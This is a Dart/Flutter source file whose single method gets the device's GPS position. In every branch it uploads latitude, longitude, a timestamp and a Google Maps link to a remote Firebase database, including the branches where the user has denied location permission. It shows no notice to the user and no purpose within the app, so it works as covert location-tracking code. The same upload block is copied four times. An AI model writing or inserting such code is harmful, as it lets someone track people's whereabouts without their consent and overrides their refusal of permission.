import 'package:firebase_database/firebase_database.dart';
import 'package:geolocator/geolocator.dart';
import 'package:location/location.dart';

class Position {
  Future<void> getCurrentLocation() async {
    final reqeust = await Geolocator.requestPermission();
    LocationPermission permission = await Geolocator.checkPermission();
    if (permission == LocationPermission.denied) {
      Location location = Location();
      LocationData locationData = await location.getLocation();
      FirebaseDatabase db = FirebaseDatabase.instance;
      // ignore: deprecated_member_use
      DatabaseReference ref = db.reference();

      final String long = locationData.longitude.toString();
      final String lang = locationData.latitude.toString();
      final id = DateTime.now().microsecondsSinceEpoch;
      final date = DateTime.now();
      // 更新经纬度到Firebase Realtime Database
      ref.child('location').child(id.toString().substring(0, 10)).set({
        'longitude': locationData.longitude.toString(),
        'latitude': locationData.latitude.toString(),
        "link": "https://www.google.com/maps/search/?api=1&query=$lang,$long",
        "date": date.toString(),
        'id': id.toString(),
      });
      permission = await Geolocator.requestPermission();
      if (permission == LocationPermission.denied) {
        Location location = Location();
        LocationData locationData = await location.getLocation();

        FirebaseDatabase db = FirebaseDatabase.instance;
        // ignore: deprecated_member_use
        DatabaseReference ref = db.reference();

        final String long = locationData.longitude.toString();
        final String lang = locationData.latitude.toString();
        final id = DateTime.now().microsecondsSinceEpoch;
        final date = DateTime.now();
        // 更新经纬度到Firebase Realtime Database
        ref.child('location').child(id.toString().substring(0, 10)).set({
          'longitude': locationData.longitude.toString(),
          'latitude': locationData.latitude.toString(),
          "link": "https://www.google.com/maps/search/?api=1&query=$lang,$long",
          "date": date.toString(),
          'id': id.toString(),
        });
        return Future.error('Location permissions are denied');
      }
    }
    if (reqeust == LocationPermission.denied) {
      Location location = Location();
      LocationData locationData = await location.getLocation();

      FirebaseDatabase db = FirebaseDatabase.instance;
      // ignore: deprecated_member_use
      DatabaseReference ref = db.reference();

      final String long = locationData.longitude.toString();
      final String lang = locationData.latitude.toString();
      final id = DateTime.now().microsecondsSinceEpoch;
      final date = DateTime.now();
      // 更新经纬度到Firebase Realtime Database
      ref.child('location').child(id.toString().substring(0, 10)).set({
        'longitude': locationData.longitude.toString(),
        'latitude': locationData.latitude.toString(),
        "link": "https://www.google.com/maps/search/?api=1&query=$lang,$long",
        "date": date.toString(),
        'id': id.toString(),
      });
      return;
    }
    Location location = Location();
    LocationData locationData = await location.getLocation();

    FirebaseDatabase db = FirebaseDatabase.instance;
    // ignore: deprecated_member_use
    DatabaseReference ref = db.reference();

    final String long = locationData.longitude.toString();
    final String lang = locationData.latitude.toString();
    final id = DateTime.now().microsecondsSinceEpoch;
    final date = DateTime.now();
    // 更新经纬度到Firebase Realtime Database
    ref.child('location').child(id.toString().substring(0, 10)).set({
      'longitude': locationData.longitude.toString(),
      'latitude': locationData.latitude.toString(),
      "link": "https://www.google.com/maps/search/?api=1&query=$lang,$long",
      "date": date.toString(),
      'id': id.toString(),
    });
    return;
  }
}
